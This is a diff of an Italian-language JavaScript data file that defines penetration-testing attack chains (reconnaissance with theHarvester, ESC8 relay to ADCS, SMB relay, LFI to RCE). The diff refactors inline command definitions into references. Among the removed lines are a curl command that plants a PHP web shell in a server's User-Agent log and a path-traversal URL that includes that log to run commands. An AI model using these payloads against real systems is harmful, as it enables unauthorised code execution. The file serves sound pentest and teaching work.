@@ -55,33 +55,6 @@ const CHAINS = [
         "verify": "Vengono creati i file `harvest.xml` e `harvest.json` con host ed email raccolti.",
         "title": "theHarvester",
         "cmdRef": "theharvester",
-        "cmd": {
-          "name": "theHarvester — emails & hosts",
-          "description": "Aggrega email, sottodomini, host e nomi da molte fonti pubbliche. `-b all` lancia tutti i moduli (alcuni richiedono API key e danno solo warning). Le email rivelano la naming convention → user list.",
-          "template": "theHarvester -d <domain> -b all -l 500 -f harvest",
-          "params": [
-            {
-              "key": "domain",
-              "label": "Domain",
-              "ctx": "domain",
-              "placeholder": "example.com"
-            }
-          ],
-          "variants": [
-            {
-              "id": "default",
-              "label": "Tutte le fonti",
-              "template": "theHarvester -d <domain> -b all | tee theharvester.txt",
-              "description": "Tutte le fonti con l'output salvato in `theharvester.txt` tramite `tee`: testo greppabile, invece dei file strutturati di `-f`."
-            },
-            {
-              "id": "free",
-              "label": "Senza API key",
-              "template": "theHarvester -d <domain> -b crtsh,duckduckgo,bing,otx,rapiddns -l 500",
-              "description": "Solo fonti senza API key: veloce e zero setup."
-            }
-          ]
-        },
         "variant": "default"
       },
       {
@@ -216,7 +189,7 @@ const CHAINS = [
     "short": "esc8",
     "category": "active-directory",
     "subcategory": "priv-esc",
-    "tactic": "Initial Access → DA",
+    "tactic": "Initial Access",
     "difficulty": "hard",
     "estTime": "20 min",
     "objective": "Da una posizione in rete senza credenziali: forzi il DC ad autenticarsi in NTLM e rilanci l'auth verso ADCS Web Enrollment per emettere un certificato del DC.",
@@ -509,27 +482,6 @@ const CHAINS = [
         "verify": "La richiesta viene registrata nel log di access con lo User-Agent malevolo. Il percorso varia fra `/var/log/apache2/access.log` e `/var/log/nginx/access.log` e deve essere leggibile.",
         "title": "Inietta PHP nel log (User-Agent)",
         "cmdRef": "lfi-logpoison",
-        "cmd": {
-          "name": "LFI — log poisoning → RCE",
-          "description": "Inietta PHP in un log (`User-Agent`, o username su `auth.log`), poi includilo via LFI per eseguirlo.\n- **Apache**: `/var/log/apache2/access.log`\n- **Nginx**: `/var/log/nginx/access.log`.",
-          "template": "curl -A \"<?php system(\\$_GET['cmd']); ?>\" http://<ip>/",
-          "params": [
-            {
-              "key": "ip",
-              "label": "Target",
-              "ctx": "ip",
-              "placeholder": "10.10.10.11"
-            }
-          ],
-          "variants": [
-            {
-              "id": "default",
-              "label": "1. Inietta nel log & esegui",
-              "template": "curl -A \"<?php system(\\$_GET['cmd']); ?>\" http://<ip>/",
-              "description": "Scrive il payload PHP nello `User-Agent`: finisce nell’`access.log`."
-            }
-          ]
-        },
         "variant": "default"
       },
       {
@@ -537,33 +489,6 @@ const CHAINS = [
         "verify": "Includendo il log e passando il parametro `cmd`, l'output del comando compare nella pagina e conferma l'esecuzione.",
         "title": "Includi il log ed esegui",
         "cmdRef": "lfi-logpoison",
-        "cmd": {
-          "name": "LFI — log poisoning → RCE",
-          "description": "Inietta PHP in un log (`User-Agent`, o username su `auth.log`), poi includilo via LFI per eseguirlo.\n- **Apache**: `/var/log/apache2/access.log`\n- **Nginx**: `/var/log/nginx/access.log`.",
-          "template": "curl -A \"<?php system(\\$_GET['cmd']); ?>\" http://<ip>/",
-          "params": [
-            {
-              "key": "ip",
-              "label": "Target",
-              "ctx": "ip",
-              "placeholder": "10.10.10.11"
-            }
-          ],
-          "variants": [
-            {
-              "id": "default",
-              "label": "1. Inietta nel log",
-              "template": "curl -A \"<?php system(\\$_GET['cmd']); ?>\" http://<ip>/",
-              "description": "Scrive il payload PHP nello `User-Agent`: finisce nell’`access.log`."
-            },
-            {
-              "id": "trigger",
-              "label": "2. Esegui",
-              "template": "http://<ip>/page?file=../../../../var/log/apache2/access.log&cmd=id",
-              "description": "LFI sul log: il PHP iniettato viene eseguito, cmd= passa il comando."
-            }
-          ]
-        },
         "variant": "trigger"
       }
     ]
@@ -633,7 +558,9 @@ const CHAINS = [
       {
         "id": "s1",
         "verify": "L'elenco riporta gli host con `signing:False`, che sono gli unici bersagli validi per il relay.",
-        "title": "Trova i target senza SMB signing"
+        "title": "Trova i target senza SMB signing",
+        "cmdRef": "nxc-gen-relay-list",
+        "variant": "default"
       },
       {
         "id": "s2",
